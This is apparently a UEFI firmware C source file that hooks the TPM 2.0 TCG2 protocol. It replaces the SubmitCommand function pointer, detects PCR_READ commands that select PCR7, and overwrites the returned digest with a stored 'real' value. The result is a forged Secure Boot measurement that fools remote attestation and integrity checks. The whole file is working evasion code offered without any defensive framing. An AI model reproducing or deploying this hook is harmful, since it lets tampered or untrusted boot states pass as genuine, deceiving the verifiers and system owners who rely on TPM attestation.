#include <Uefi.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include "sb_variables.h"

#define EFI_TCG2_PROTOCOL_GUID \
  { 0x607f766c, 0x7455, 0x42be, { 0x93, 0x0b, 0xe4, 0xd7, 0x6d, 0xb2, 0x72, 0x0f } }

#define TPM_CC_PCR_READ  0x0000017Eu
#define TPM_RC_SUCCESS   0x00000000u

typedef
EFI_STATUS
(EFIAPI *EFI_TCG2_SUBMIT_COMMAND)(
    IN     UINT32   InputParameterBlockSize,
    IN     UINT8    *InputParameterBlock,
    IN OUT UINT32   *OutputParameterBlockSize,
    IN OUT UINT8    *OutputParameterBlock
    );

typedef struct _EFI_TCG2_PROTOCOL {
    VOID  *GetCapability;
    VOID  *GetEventLog;
    VOID  *HashLogExtendEvent;
    EFI_TCG2_SUBMIT_COMMAND SubmitCommand;
    VOID  *GetActivePcrBanks;
    VOID  *SetActivePcrBanks;
    VOID  *GetResultSize;
} EFI_TCG2_PROTOCOL;

static EFI_GUID gTcg2ProtocolGuid = EFI_TCG2_PROTOCOL_GUID;
static EFI_TCG2_PROTOCOL  *gTcg2Protocol = NULL;
static EFI_TCG2_SUBMIT_COMMAND OriginalTcg2SubmitCommand = NULL;

static inline UINT16 PeekBe16(const UINT8 *p) {
    return (UINT16)(((UINT32)p[0] << 8) | (UINT32)p[1]);
}
static inline UINT32 PeekBe32(const UINT8 *p) {
    return ((UINT32)p[0] << 24) | ((UINT32)p[1] << 16) |
           ((UINT32)p[2] << 8) | (UINT32)p[3];
}

static BOOLEAN
IsPcr7ReadCommand (
    const UINT8 *Cmd,
    UINT32       CmdLen
)
{
    if (CmdLen < 20) return FALSE;
    if (PeekBe32(Cmd + 6) != TPM_CC_PCR_READ) return FALSE;

    const UINT8 *p = Cmd + 10;
    if (p + 4 > Cmd + CmdLen) return FALSE;
    UINT32 sel_count = PeekBe32(p);
    p += 4;

    for (UINT32 i = 0; i < sel_count; i++) {
        if (p + 6 > Cmd + CmdLen) return FALSE;
        UINT8 sizeof_select = p[2];
        if (sizeof_select < 1) return FALSE;
        if (p[3] & 0x80) return TRUE;
        p += 6;
    }
    return FALSE;
}

static VOID
PatchPcr7InResponse (
    UINT8       *Rsp,
    UINT32       RspLen,
    const UINT8 *FakeDigest32
)
{
    if (RspLen < 10) return;
    if (PeekBe32(Rsp + 6) != TPM_RC_SUCCESS) return;

    const UINT8 *p = Rsp + 10;
    const UINT8 *end = Rsp + RspLen;

    if (p + 4 > end) return;
    UINT32 sel_count = PeekBe32(p);
    p += 4;

    for (UINT32 i = 0; i < sel_count; i++) {
        if (p + 6 > end) return;
        p += 6;
    }

    if (p + 4 > end) return;
    UINT32 digest_count = PeekBe32(p);
    p += 4;

    for (UINT32 i = 0; i < digest_count; i++) {
        if (p + 2 > end) return;
        UINT16 dsize = PeekBe16(p);
        p += 2;
        if (p + dsize > end) return;
        if (dsize == 32) {
            CopyMem((VOID *)p, FakeDigest32, 32);
            return;
        }
        p += dsize;
    }
}

static EFI_STATUS
EFIAPI
HookedTcg2SubmitCommand (
    IN     UINT32   InputParameterBlockSize,
    IN     UINT8    *InputParameterBlock,
    IN OUT UINT32   *OutputParameterBlockSize,
    IN OUT UINT8    *OutputParameterBlock
)
{
    EFI_STATUS Status = OriginalTcg2SubmitCommand(
        InputParameterBlockSize,
        InputParameterBlock,
        OutputParameterBlockSize,
        OutputParameterBlock
    );

    if (EFI_ERROR(Status)) return Status;
    if (!InputParameterBlock || !OutputParameterBlock) return Status;

    if (IsPcr7ReadCommand(InputParameterBlock, InputParameterBlockSize) &&
        *OutputParameterBlockSize >= 26)
    {
        PatchPcr7InResponse(
            OutputParameterBlock,
            *OutputParameterBlockSize,
            g_RealPCR7
        );
    }

    return Status;
}

EFI_STATUS
InstallTcg2Hook (
    VOID
)
{
    EFI_STATUS Status = gBS->LocateProtocol(
        &gTcg2ProtocolGuid,
        NULL,
        (VOID **)&gTcg2Protocol
    );

    if (EFI_ERROR(Status) || !gTcg2Protocol) {
        return EFI_NOT_FOUND;
    }

    OriginalTcg2SubmitCommand = gTcg2Protocol->SubmitCommand;
    gTcg2Protocol->SubmitCommand = HookedTcg2SubmitCommand;

    return EFI_SUCCESS;
}